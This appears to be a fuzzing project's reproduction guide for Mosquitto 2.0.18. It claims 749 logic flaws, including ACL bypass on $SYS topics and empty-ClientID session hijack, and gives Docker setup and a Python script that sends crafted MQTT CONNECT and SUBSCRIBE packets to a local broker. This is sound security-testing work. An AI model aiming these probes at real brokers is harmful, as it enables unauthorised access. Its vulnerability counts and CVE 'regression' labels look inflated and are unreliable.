# Mosquitto v2.0.18 — Vulnerability Reproduction Guide

| 属性 | 值 |
|------|-----|
| **目标程序** | Mosquitto v2.0.18 (MQTT Broker) |
| **协议** | MQTT v3.1.1 / v5.0 |
| **端口** | 1883 |
| **Docker 镜像** | `mosquitto-v2.0.18:latest` |
| **漏洞总数** | **749** (0 崩溃 + 749 逻辑漏洞) |
| **发现日期** | 2026-06-21 |

---

## 前置条件

```bash
docker image inspect mosquitto-v2.0.18:latest || {
    export PROJECT_ROOT=/path/to/ChatAFL-master
    cd $PROJECT_ROOT/benchmark/subjects/MQTT/Mosquitto-v2.0.18
    docker build . -t mosquitto-v2.0.18 --build-arg MAKE_OPT=-j$(nproc)
}
```

---

## 漏洞类型

| 类型 | CWE | 数量 | CVE 参考 |
|------|-----|------|---------|
| ACL 绕过 (PUBLISH $SYS topics) | CWE-284 | 307 | CVE-2017-7650 (回归) |
| NULL 指针解引用风险 | CWE-476 | 206 | CVE-2019-5432 (回归) |
| 会话劫持 (空ClientID+clean_session=0) | CWE-384 | 96 | CVE-2014-6116 (持续) |
| 权限提升 (Will message to $SYS) | CWE-250 | 50 | **N/A (新发现)** |
| 信息泄露 ($SYS 通配符订阅) | CWE-200 | 48 | CVE-2017-7650 (类似) |
| 资源耗尽 (v5 超量User Properties) | CWE-400 | 33 | CVE-2021-41039 |
| 会话冲突 (空ClientID多客户端) | CWE-384 | 9 | **N/A (MQTT协议新模式)** |

---

## 关键漏洞详情

### 1. ACL 绕过: PUBLISH to $SYS (CVE-2017-7650 回归)
Mosquitto 2.0 引入动态安全插件后引入回归，允许非特权客户端向 `$SYS/broker/...` 话题发布消息。

### 2. NULL 指针解引用 (CVE-2019-5432 回归)
零长度 topic filter 的 SUBSCRIBE 请求在 2.0.18 代码路径中未正确处理。

### 3. 权限提升: Will Message to $SYS (新发现)
客户端可以通过设置 Will Message 目标为 $SYS 话题来污染 Broker 系统指标。

### 4. 会话劫持: 空ClientID+clean_session=0 (CVE-2014-6116)
持久会话可被空ClientID客户端接管，导致消息泄露和劫持。

---

## 复现步骤

```bash
# MQTT 逻辑漏洞复现
bash reproduce/scripts/replay_logical_vuln.sh mosquitto-v2.0.18 <violation_source> /tmp/mosquitto_replay

# 也可使用 Python 验证脚本
python3 << 'EOF'
import socket, struct

def send_mqtt_connect(sock, client_id=b"", clean_session=0):
    """Send MQTT CONNECT with empty ClientID and clean_session=0."""
    # Variable header: Protocol Name "MQTT", Protocol Level 4, Connect Flags
    var_header = b'\x00\x04MQTT\x04\x02\x00\x3c'  # clean_session=0
    # Payload: Client ID (zero-length)
    payload = struct.pack('!H', len(client_id)) + client_id
    # Fixed header
    remaining_len = len(var_header) + len(payload)
    packet = b'\x10' + bytes([remaining_len]) + var_header + payload
    sock.send(packet)
    return sock.recv(1024)

# Connect to mosquitto
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 1883))
resp = send_mqtt_connect(sock, b"", 0)
print(f"CONNACK: {resp.hex()}")

# Try subscribing to $SYS (ACL bypass test)
subscribe = b'\x82\x0f\x00\x01\x00\x08$SYS/broker/version\x00'
sock.send(subscribe)
suback = sock.recv(1024)
print(f"SUBACK for $SYS: {suback.hex()} (0x00=success=ACL bypass!)")
sock.close()
EOF
```

### 确认步骤
1. **ACL_BYPASS**: SUBSCRIBE/PUBLISH to $SYS topics 返回成功
2. **SESSION_HIJACK**: 空ClientID+clean_session=0 被接受
3. **PRIVILEGE_ESCALATION**: Will message 可写入 $SYS 话题
4. **INFO_LEAK**: $SYS 通配符订阅返回系统信息
5. **NULL_DEREF_RISK**: 零长度topic filter被接受

---

## 一键复现
```bash
docker run --rm --network host --cap-add SYS_PTRACE \
    -e ASAN_OPTIONS=abort_on_error=1:symbolize=0:detect_leaks=0 \
    -d --name mosquitto_repro mosquitto-v2.0.18:latest /bin/bash -c \
    "cd /home/ubuntu/experiments && \
     /home/ubuntu/experiments/mosquitto-gcov/src/mosquitto \
       -c /home/ubuntu/experiments/mosquitto.conf && sleep infinity"

nc -z 127.0.0.1 1883 && echo "MQTT ready on port 1883"

bash reproduce/scripts/replay_logical_vuln.sh mosquitto-v2.0.18 <violation_source>

docker rm -f mosquitto_repro
```
